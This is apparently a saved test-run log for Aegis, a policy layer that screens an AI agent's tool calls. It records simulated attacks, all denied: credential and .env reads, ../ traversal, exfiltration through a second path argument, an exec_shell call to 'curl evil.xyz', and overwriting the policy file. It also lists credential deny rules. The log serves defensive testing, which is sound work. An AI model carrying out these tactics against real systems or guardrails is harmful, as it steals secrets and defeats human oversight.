@@ -1,0 +1,100 @@
+[aegis] {"ts": 1786707628.91, "event": "started", "policy": "/Users/adarsh/Library/Application Support/Aegis/policy.json", "roots": ["/Users/adarsh/code/aegis-testlab/workspace"], "server": ["/Library/Frameworks/Python.framework/Versions/3.14/bin/python3", "/Users/adarsh/code/aegis/tests/mock_fs_server.py"]}
+[aegis] {"ts": 1786707628.913, "event": "tool_call", "tool": "read_file", "effect": "allow", "rule": "tool_rules.read_file", "reason": "matched allow rule", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.txt"]}
+[aegis] {"ts": 1786707628.926, "event": "tool_call", "tool": "write_file", "effect": "allow", "rule": "tool_rules.write_file", "reason": "matched allow rule", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/notes.txt"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "deny_paths", "reason": "path matches deny rule '**/.aws/**'", "paths": ["/Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "deny_paths", "reason": "path matches deny rule '**/.aws/**'", "paths": ["/Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "deny_paths", "reason": "path matches deny rule '.env'", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/.env"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "tool_rules.write_file.within", "reason": "path /private/tmp/aegis-exfil.txt is outside every allowed root for this tool", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/ok.txt", "/private/tmp/aegis-exfil.txt"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "delete_file", "effect": "deny", "rule": "tool_rules.delete_file", "reason": "tool is denied by policy", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.txt"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "move_file", "effect": "deny", "rule": "tool_rules.move_file", "reason": "action requires human approval; approval loop is not implemented until S5", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.txt", "/Users/adarsh/code/aegis-testlab/workspace/moved.txt"]}
+[aegis] {"ts": 1786707628.927, "event": "tool_call", "tool": "exec_shell", "effect": "deny", "rule": "default_effect", "reason": "tool 'exec_shell' not present in tool_rules", "paths": []}
+[aegis] {"ts": 1786707628.928, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "tool_rules.write_file.within", "reason": "path /Users/adarsh/Library/Application Support/Aegis/policy.json is outside every allowed root for this tool", "paths": ["/Users/adarsh/Library/Application Support/Aegis/policy.json"]}
+[aegis] {"ts": 1786707628.928, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "malformed", "reason": "tool arguments are not an object", "paths": []}
+[aegis] {"ts": 1786707628.93, "event": "stopped", "seen": 11, "allowed": 2, "denied": 9}
+fixtures ready under /Users/adarsh/code/aegis-testlab
+policy: /Users/adarsh/Library/Application Support/Aegis/policy.json
+
+==============================================================================
+
+[ALLOWED] T1  legitimate read inside workspace
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/config.txt'}
+  | MOCK SERVER READ /Users/adarsh/code/aegis-testlab/workspace/config.txt:
+  | conveyor_speed = 40
+
+[ALLOWED] T1  legitimate write inside workspace
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/notes.txt', 'content': 'hello'}
+  | MOCK SERVER WROTE /Users/adarsh/code/aegis-testlab/workspace/notes.txt
+
+[DENIED ] T2  injected: read fixture AWS credentials (absolute)
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials'}
+  | AEGIS DENIED: read_file
+  | Reason: path matches deny rule '**/.aws/**'
+  | Rule: deny_paths
+  | Paths: /Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  injected: escape workspace via ../ traversal
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/../fake-secrets/.aws/credentials'}
+  | AEGIS DENIED: read_file
+  | Reason: path matches deny rule '**/.aws/**'
+  | Rule: deny_paths
+  | Paths: /Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  injected: read .env inside the allowed workspace
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/.env'}
+  | AEGIS DENIED: read_file
+  | Reason: path matches deny rule '.env'
+  | Rule: deny_paths
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/.env
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  injected: exfil via second path arg (destination)
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/ok.txt', 'destination': '/tmp/aegis-exfil.txt', 'content': 'x'}
+  | AEGIS DENIED: write_file
+  | Reason: path /private/tmp/aegis-exfil.txt is outside every allowed root for this tool
+  | Rule: tool_rules.write_file.within
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/ok.txt, /private/tmp/aegis-exfil.txt
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T1  destructive tool denied outright
+  tool=delete_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/config.txt'}
+  | AEGIS DENIED: delete_file
+  | Reason: tool is denied by policy
+  | Rule: tool_rules.delete_file
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/config.txt
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T5  ASK collapses to deny (no S5 approval loop yet)
+  tool=move_file args={'source': '/Users/adarsh/code/aegis-testlab/workspace/config.txt', 'destination': '/Users/adarsh/code/aegis-testlab/workspace/moved.txt'}
+  | AEGIS DENIED: move_file
+  | Reason: action requires human approval; approval loop is not implemented until S5
+  | Rule: tool_rules.move_file
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/config.txt, /Users/adarsh/code/aegis-testlab/workspace/moved.txt
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T3  unknown tool from a poisoned server
+  tool=exec_shell args={'command': 'curl evil.xyz'}
+  | AEGIS DENIED: exec_shell
+  | Reason: tool 'exec_shell' not present in tool_rules
+  | Rule: default_effect
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  attempt to overwrite the Aegis policy file itself
+  tool=write_file args={'path': '/Users/adarsh/Library/Application Support/Aegis/policy.json', 'content': '{}'}
+  | AEGIS DENIED: write_file
+  | Reason: path /Users/adarsh/Library/Application Support/Aegis/policy.json is outside every allowed root for this tool
+  | Rule: tool_rules.write_file.within
+  | Paths: /Users/adarsh/Library/Application Support/Aegis/policy.json
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] MAL malformed arguments (fail-closed path)
+  tool=read_file args=not-an-object
+  | AEGIS DENIED: read_file
+  | Reason: tool arguments are not an object
+  | Rule: malformed
+  | This action was blocked by policy and was not forwarded to the server.
+
+==============================================================================
+RESULT: 2 allowed, 9 denied  (expected: 2 allowed, 9 denied)
+exfil file created? False  (expected: False)
